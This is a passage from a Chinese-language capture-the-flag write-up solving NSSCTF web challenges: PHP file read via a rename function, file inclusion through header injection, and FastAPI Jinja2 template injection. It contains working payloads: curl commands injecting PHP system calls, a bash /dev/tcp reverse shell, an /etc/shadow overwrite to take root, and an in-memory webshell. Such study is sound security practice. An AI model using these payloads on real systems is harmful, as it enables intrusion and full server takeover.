login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#文件后缀白名单检测，我就不信你还能上传php文件，嘻嘻嘻</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我不想看到php文件&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;怎么没有东西，这我改什么&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件重命名成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">files</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">files</span> = <span class="title">scandir</span>(&quot;./<span class="title">uploads</span>/&quot;);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span> ($<span class="title">files</span> <span class="title">as</span> $<span class="title">file</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;a href=<span class="string">&quot;./uploads/&lt;?=<span class="subst">$file</span>?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span><span class="variable">$file</span><span class="meta">?&gt;</span>&lt;/a&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> &#125;&#125;&#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>我把无关紧要的html部分给删了！</p><p>先看第一个php块，就是一个只能上传图片的白名单检测</p><p>第二个php块关键部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>它会将读到的文件写入新的文件名，那不就直接任意文件读取了嘛xd</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?old<span class="built_in">_</span>name=/flag<span class="built_in">&amp;</span>new<span class="built_in">_</span>name=rufeii</span><br><span class="line">NSSCTF&#123;77e17714-ce59-431d-b605-0db30f8bbb50&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include-revenge"><a href="#ez-include-revenge" class="headerlink" title="ez_include_revenge"></a>ez_include_revenge</h2><p>前面那道题的加强版</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);   <span class="comment">//禁用php流封装协议</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;                                   <span class="comment">//创建目录用的函数，后面接了个对&#x27;进行转义的函数</span></span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);        <span class="comment">//创建users/rand/目录并切到这个目录，也就是说此时网站根目录指向这个</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"><span class="comment">//xff可以控制创建的目录，但是有替换，basename返回文件名部分，好像这里没什么用</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));   <span class="comment">//创建目录，并且在我们创建的目录下写入环境变量</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);       <span class="comment">//回到users/rand/</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);      <span class="comment">//过滤点</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这次不会让你得逞了！&quot;</span>;       <span class="comment">//flag被严格过滤，上个版本的不能打了</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再想想?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);     <span class="comment">//删除创建的目录</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>那么分析完源码，不能用点和php伪协议，试了一下data伪协议，<code>allow_url_include=0</code>直接限制死了远程包含都不行了，session包含暂且不说能不能过waf，我估计<strong>session.upload_progress.enabled</strong>这个没开，也打不了！下面打不通了，就只能考虑配合上面一起打了</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><code>file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</code>能不能利用这个文件呢？</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: rufeii&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=rufeii/profile&quot;</span><br><span class="line">这个不行肯定会被检测到</span><br><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: .&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=profile&quot;但是这个就打出来了非预期说是</span><br></pre></td></tr></table></figure><p>莫名其妙，所以说还是要多去尝试，看似不可能实则也有可能！</p><p>为什么会出现非预期？</p><p><img src="/images/achieve/2025/11/4.png"></p><p>file_gets_contents只会在工作目录找！</p><p><img src="/images/achieve/2025/11/5.png"></p><p>mkdir无法递归创建目录除非使用-p参数。那么前面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>); </span><br></pre></td></tr></table></figure><p>就是没用的，这点其实在报错中也可以体现！然后如果xff为空profile就写在html目录下，chdir(‘..’)到www，所以此时工作目录是www！脚本目录是html！file_gets_contents在工作目录肯定找不到profile，但是include会去脚本目录找，所以直接绕过。</p><p>也就是说我们把profile写到了脚本目录去（&#x2F;var&#x2F;www&#x2F;html&#x2F;profile），然后工作目录不是脚本目录的时候就可以绕过！利用的是这两个函数处理的差异性！</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>前面说到是因为少了-p参数不能递归创造目录，导致profile写到了脚本目录，如果有的话，肯定上面的打法就失效了！那么就是预期的打法！</p><p>预期打法就是利用这两个玩意对伪协议检测差异！</p><blockquote><p>file_get_contens对data协议的检测data:[<mediatype>][;base64],<data><br>include [协议头]:&#x2F;&#x2F;这个才能检测成伪协议</p></blockquote><p>也就是说我们把文件名命名为这种形式是不是就可以让<code>file_get_contents</code>认为是伪协议，但是include会去包含！所以甚牛而逼之！</p><p>payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;X-Forwarded-For: data:,rufeii&quot; -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node9.anna.nssctf.cn:25670/?page=data:,rufeii/profile&quot;</span><br></pre></td></tr></table></figure><h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><h3 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h3><p>这题的非预期是出网反弹shell</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse, JSONResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">Jinja2 = Environment(</span><br><span class="line">    variable_start_string=<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    variable_end_string=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request, exc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        status_code=<span class="number">404</span>,</span><br><span class="line">        content=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Not found&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say1&#x27;</span>] = <span class="string">&#x27;hello!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say2&#x27;</span>] = <span class="string">&#x27;hi!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/shellMe&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">shellMe</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=<span class="string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_disabled</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;此路不通！该方法已被管理员禁用。&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>由于没回显，本地调成有回显的方便找东西，最后exp：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;self.<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span>TemplateReference<span class="built_in">_</span><span class="built_in">_</span>context.keys()&#125;先用这个看下有哪些内置的东西可以使用</span><br><span class="line">用bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;去弹shell</span><br><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;&#x27;).read()&#125;注意url编码一下就好了</span><br></pre></td></tr></table></figure><p>哈哈拿到shell之后flag就在跟目录下，但是没有权限！先看下能不能suid提权，但是没有好的suid提权命令！</p><p>sudo 提权</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l发现可以用chmod命令提权，这是一个设置文件权限的命令，对于这道题来说我们只需要</span><br><span class="line">chmod 764 /flag 就可以直接读了</span><br><span class="line">拿下整台机子</span><br><span class="line">chmod 766 /etc/shadow</span><br><span class="line">echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /etc/shadow</span><br><span class="line">然后su root（密码就是我们改的root）这样就拿下了</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/6.png"></p><h3 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h3><p>那么说到非预期是出网打反弹shell，那么预期自然就是不出网打内存马呗！</p><p>这里就不是flask框架下的内存马了，是FaskAPI框架！参考：<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI 内存马的研究 - caterpie的小站</a></p><ol><li>经典路线打路由添加函数</li><li>新路线的探究</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br></pre></td></tr></table></figure><p>只能打第二种了，这次当回脚本小子！感觉挺有意思的，打算后面研究一下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.app.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>这个payload我在本地打通了，放到远程就打不通了！后面一步一步fuzz，发现是中间件的问题，就一个app</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>byd还是打不通，还是一步步测试，发现题目<code>sys.modules[&#39;__main__&#39;]</code>下面没有app，真奇怪，难道是bao师傅把它删了？后面BR师傅说是在app模块压根就不在main模块，但是本地为什么可以呢？</p><p>附件里面还有个start.sh被我忽略了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span 